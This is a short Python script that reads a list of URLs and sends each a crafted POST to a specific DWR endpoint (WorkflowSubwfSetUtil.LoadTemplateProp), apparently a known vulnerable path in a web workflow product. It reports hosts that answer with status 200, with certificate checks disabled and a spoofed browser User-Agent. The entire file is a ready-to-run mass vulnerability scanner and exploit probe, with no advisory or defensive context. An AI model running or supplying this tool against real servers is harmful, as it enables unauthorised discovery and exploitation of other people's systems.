#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import argparse
import requests
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

VULN_PATH = "/dwr/call/plaincall/?callCount=1&c0-id=1&c0-scriptName=WorkflowSubwfSetUtil&c0-methodName=LoadTemplateProp&batchId=a&c0-param0=string:mobilemode&scriptSessionId=1&a=.swf"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Upgrade-Insecure-Requests": "1",
}

def check_url(base_url):
    try:
        url = "https://" + base_url if not base_url.startswith(("http://", "https://")) else base_url
        parsed = urlparse(url)
        target = f"{parsed.scheme}://{parsed.netloc}{VULN_PATH}"
        resp = requests.post(target, headers=HEADERS, timeout=10, verify=False)
        if resp.status_code == 200:
            print(f"[+] {target} --> 200")
            return
        if not base_url.startswith(("http://", "https://")):
            url = "http://" + base_url
            parsed = urlparse(url)
            target = f"{parsed.scheme}://{parsed.netloc}{VULN_PATH}"
            resp = requests.post(target, headers=HEADERS, timeout=10, verify=False)
            if resp.status_code == 200:
                print(f"[+] {target} --> 200")
                return
    except requests.RequestException:
        pass

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-f", "--file", required=True)
    args = parser.parse_args()
    with open(args.file, "r") as f:
        urls = [line.strip() for line in f if line.strip()]
    for url in urls:
        check_url(url)

if __name__ == "__main__":
    main()

